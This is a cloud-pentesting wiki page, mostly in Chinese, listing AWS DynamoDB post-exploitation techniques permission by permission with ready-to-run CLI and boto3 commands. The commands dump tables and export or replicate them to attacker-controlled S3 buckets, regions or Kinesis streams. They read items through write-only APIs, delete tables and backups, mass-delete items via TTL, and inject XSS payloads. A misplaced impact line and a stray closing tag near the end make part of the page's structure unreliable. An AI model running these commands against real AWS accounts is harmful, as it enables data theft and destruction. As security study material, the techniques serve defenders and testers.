# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

更多信息请查看：

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

拥有此权限的攻击者能够 **通过主键从表中获取项**（不能直接请求表中所有数据）。这意味着你需要知道主键（你可以通过获取表的元数据（`describe-table`）来获得它们）。

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** 通过在表中定位敏感信息实现间接 privesc

### `dynamodb:GetItem`

**Similar to the previous permissions** 这个权限与前面的权限类似，允许潜在的攻击者在已知项的主键的情况下，从单个表中读取值：
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
有了此权限，也可以使用 **`transact-get-items`** 方法，例如:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potential Impact:** 间接 privesc：通过定位表中的敏感信息

### `dynamodb:Query`

**与之前的权限类似**，这项权限允许潜在攻击者在知道条目的主键时，仅从一个表中读取值。它允许使用 [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html)，但与必须出现的主键一起允许的唯一比较是 "EQ"，因此你不能通过比较在一次请求中获取整个 DB。

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**潜在影响：** 间接的 privesc：通过在表中定位敏感信息

### `dynamodb:Scan`

您可以使用此权限来 **dump the entire table easily**
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**潜在影响：** 通过在表中定位敏感信息导致间接 privesc

### `dynamodb:PartiQLSelect`

您可以使用此权限来 **轻松 dump 整个表**。
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
此权限还允许执行类似 `batch-execute-statement` 的操作：
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
但是你需要为主键指定一个值，所以这并不是很有用。

**潜在影响：** 通过在表中定位敏感信息实现间接 privesc

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

此权限允许攻击者将**整张表导出到其选择的 S3 bucket**：
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
注意：要使此方法生效，该表必须启用 point-in-time-recovery。你可以使用以下命令检查表是否启用：
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
如果它尚未启用，您需要**启用它**，为此您需要**`dynamodb:ExportTableToPointInTime`**权限：
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**潜在影响：** 间接 privesc：通过在表中定位敏感信息

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

拥有这些权限的攻击者可以 **从备份创建新表**（甚至可以先创建备份，然后在另一个表中恢复）。随后，如果拥有必要的权限，他就可以查看备份中的 **信息**，这些信息**可能不再出现在生产表中**。
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potential Impact:** 通过在表备份中定位敏感信息间接实现 privesc

### `dynamodb:PutItem`

此权限允许用户将 **新项添加到表中或用新项替换现有项**。如果具有相同主键的项已存在，**整个项将被新项替换**。如果主键不存在，将创建具有指定主键的**新项**。

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**潜在影响：** 通过能够在 DynamoDB 表中添加/修改数据，可能导致进一步漏洞/绕过 被利用

### `dynamodb:UpdateItem`

此权限允许用户**修改项的现有属性或向项添加新属性**。它**不会替换**整个项；它仅更新指定的属性。如果表中不存在该主键，则该操作将使用指定的主键**创建新的项**，并根据更新表达式设置指定的属性。

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** 通过在 DynamoDB 表中添加/修改数据，可能被用于利用更多的 vulnerabilities/bypasses

### `dynamodb:DeleteTable`

拥有此权限的攻击者可以**删除 DynamoDB 表，导致数据丢失**。
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**潜在影响**：数据丢失以及依赖被删除表的服务中断。

### `dynamodb:DeleteBackup`

拥有此权限的攻击者可以**删除 DynamoDB 备份，可能在灾难恢复场景中导致数据丢失**。
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potential impact**: 在灾难恢复场景中可能导致数据丢失，并且无法从备份中恢复。

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: 测试这是否确实可行

拥有这些权限的攻击者可以**在 DynamoDB 表上启用 stream、更新表以开始流式传输更改，然后访问该 stream 以实时监控表的更改**。这使攻击者能够监控并 exfiltrate data changes，可能导致 data leakage。

1. 在 DynamoDB 表上启用 stream：
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. 描述该 stream 以获取 ARN 和其他详细信息：
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. 使用流 ARN 获取分片迭代器：
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. 使用 shard iterator 访问并 exfiltrate 来自 stream 的数据：
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**潜在影响**: 实时监控并导致 DynamoDB 表更改的数据 leak。

### 通过 `dynamodb:UpdateItem` 和 `ReturnValues=ALL_OLD` 读取项

攻击者如果在某表上仅拥有 `dynamodb:UpdateItem` 权限，可以在没有常规读取权限（`GetItem`/`Query`/`Scan`）的情况下，通过执行一次无害的更新并请求 `--return-values ALL_OLD` 来读取项。DynamoDB 会在响应的 `Attributes` 字段中返回该项更新前的完整镜像（这不会消耗 RCUs）。

- 最低权限：在目标表/键上具有 `dynamodb:UpdateItem`。
- 前提条件：你必须知道该项的主键。

示例（添加一个无害的属性并在响应中 exfiltrates 先前的 item）：
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
The CLI 响应将包含一个 `Attributes` 块，里面包含完整的先前项（所有属性），实际上从仅有写权限中提供了一个读取原语。

**潜在影响：** 在只有写权限的情况下读取表中的任意项；当主键已知时，可导致敏感数据外泄。


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

通过向 DynamoDB Global Table（版本 2019.11.21）添加新的 replica Region，实现隐蔽的外泄。如果某个主体可以添加区域副本，整个表将被复制到攻击者选定的 Region，攻击者可以从该 Region 读取所有项。

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

权限：`dynamodb:UpdateTable`（带 `replica-updates`）或目标表上的 `dynamodb:CreateTableReplica`。如果 replica 使用 CMK，则可能需要对该密钥的 KMS 权限。

潜在影响：将整表复制到攻击者控制的 Region，导致 stealthy data exfiltration。

### `dynamodb:TransactWriteItems` (read via failed condition + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

具有事务性写权限的攻击者可以通过在 `TransactWriteItems` 内执行一个 `Update`，该操作故意使 `ConditionExpression` 失败，同时设置 `ReturnValuesOnConditionCheckFailure=ALL_OLD`，从而 exfiltrate 一个现有项的全部属性。失败时，DynamoDB 会在事务取消原因中包含之前的属性，有效地将仅写访问转换为对目标键的读取访问。

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

权限：`dynamodb:TransactWriteItems` 在目标表（以及其底层项）上。 不需要读取权限。

潜在影响：通过返回的取消原因，仅凭事务写入权限读取表中任意项（按主键）。


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` on GSI

通过创建一个 Global Secondary Index (GSI)，并在低熵属性上设置 `ProjectionType=ALL`，将该属性在所有项中设为常量，然后 `Query` 索引以检索完整项，从而绕过读取限制。即便对基础表的 `Query`/`Scan` 被拒绝，只要你可以查询索引的 ARN，此方法仍然有效。

- 最低权限：
- `dynamodb:UpdateTable` 在目标表上（用于创建具有 `ProjectionType=ALL` 的 GSI）。
- `dynamodb:UpdateItem` 在目标表键上（用于为每个项设置被索引的属性）。
- `dynamodb:Query` 在索引资源 ARN 上（`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`）。

步骤（PoC in us-east-1）：
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**潜在影响：** 通过查询新创建的 GSI（投影所有属性）可以实现完整表 exfiltration，即使基础表读取 API 被拒绝。


### `dynamodb:EnableKinesisStreamingDestination` (Continuous exfiltration via Kinesis Data Streams)

滥用 DynamoDB Kinesis streaming destinations 将表的变更持续 exfiltrate 到攻击者控制的 Kinesis Data Stream。一旦启用，每个 INSERT/MODIFY/REMOVE 事件都会近实时地转发到该 stream，而无需表的读取权限。

最低权限（攻击者）：
- 在目标表上拥有 `dynamodb:EnableKinesisStreamingDestination`
- 可选的 `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` 用于监控状态
- 对攻击者拥有的 Kinesis stream 的读取权限以消费记录：`kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
### `dynamodb:UpdateTimeToLive`

拥有 `dynamodb:UpdateTimeToLive` 权限的攻击者可以更改表的 TTL（time-to-live，存活时间）配置——启用或禁用 TTL。  
启用 TTL 后，包含所配置 TTL 属性的单个项在到达过期时间后会被自动删除。  
TTL 值只是每个项上的另一个属性；没有该属性的项不会受到基于 TTL 的删除影响。

如果项中尚未包含 TTL 属性，攻击者还需要有用于更新项的权限（例如 `dynamodb:UpdateItem`）以添加 TTL 属性并触发大规模删除。

首先在表上启用 TTL，并指定用于过期的属性名称：
```bash
aws dynamodb update-time-to-live \
--table-name <TABLE_NAME> \
--time-to-live-specification "Enabled=true, AttributeName=<TTL_ATTRIBUTE_NAME>"
```
然后更新条目以添加 TTL 属性（epoch seconds），使它们过期并被删除：
```bash
aws dynamodb update-item \
--table-name <TABLE_NAME> \
--key '<PRIMARY_KEY_JSON>' \
--update-expression "SET <TTL_ATTRIBUTE_NAME> = :t" \
--expression-attribute-values '{":t":{"N":"<EPOCH_SECONDS_VALUE>"}}'
```
### `dynamodb:RestoreTableFromAwsBackup` & `dynamodb:RestoreTableToPointInTime`

具有 dynamodb:RestoreTableFromAwsBackup 或 dynamodb:RestoreTableToPointInTime 权限的攻击者可以创建从备份或按时间点恢复 (PITR) 恢复的新表，而不覆盖原始表。恢复的表包含所选时间点的数据完整映像，因此攻击者可以用它来 exfiltrate 历史信息或获取数据库过去状态的完整转储。

从按需备份恢复一个 DynamoDB 表：
```bash
aws dynamodb restore-table-from-backup \
--target-table-name <NEW_TABLE_NAME> \
--backup-arn <BACKUP_ARN>
```
将 DynamoDB 表恢复到某一时间点（创建一个包含恢复状态的新表）：
```bash
aws dynamodb restore-table-to-point-in-time \
--source-table-name <SOURCE_TABLE_NAME> \
--target-table-name <NEW_TABLE_NAME> \
--use-latest-restorable-time
````
</details>

**Potential Impact:** 持续、近实时地将表更改外传到攻击者控制的 Kinesis stream，而无需对表进行直接读取操作。



{{#include ../../../../banners/hacktricks-training.md}}
